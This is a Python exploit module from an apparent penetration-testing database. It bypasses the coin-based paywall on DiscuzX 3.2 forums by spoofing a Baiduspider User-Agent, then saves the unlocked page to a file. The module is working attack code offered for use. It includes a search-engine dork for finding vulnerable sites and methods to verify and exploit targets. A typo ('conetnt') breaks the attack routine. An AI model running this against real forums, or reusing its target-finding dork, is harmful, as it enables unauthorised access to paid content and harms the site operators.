#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

from script.exploit import Exploit, Result


class DiscuzAB(Exploit):
    expName = u"DiscuzX 3.2绕过虚拟币支付查看内容"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "discuz"
    appVersion = "x3.2"
    reference = ['http://www.secpulse.com/archives/33393.html','http://www.wooyun.org/bugs/wooyun-2010-099659']
    description = u'''
        漏洞利用条件：1.DiscuzX 3.2；2.没有其他权限设置
        gh: inurl:forum.php "金币 才能浏览"
    '''

    def verify(self):
        result = Result()

        sig = u"才能浏览"
        userAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
        #userAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://**.**.**.**/search/spider.html)"
        self.headers['User-Agent'] = userAgent

        try:
            response = self.http.get(self.url)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        try:
            response2 = self.http.get(self.url, headers=self.headers)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response2.status_code==200:
            if sig.encode("utf-8") in response.content and sig.encode("gbk")in response.content and  sig.encode("utf-8") not in response2.content and sig.encode("gbk") not in response2.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = userAgent

        return result


    def attack(self):
        result = Result()

        sig = u"才能浏览"
        userAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
        self.headers['User-Agent'] = userAgent

        try:
            response = self.http.get(self.url)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result
            
        try:
            response2 = self.http.get(self.url, headers=self.headers)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response2.status_code==200:
            if sig.encode("utf-8") in response.content and sig.encode("gbk")in response.content and  sig.encode("utf-8") not in response2.content and sig.encode("gbk") not in response2.content:
                with open("result.html","w") as fd:
                    fd.write(response2.conetnt)
                result['FileInfo'] = {}
                result['FileInfo']['Filename'] = "result.html"

        return result
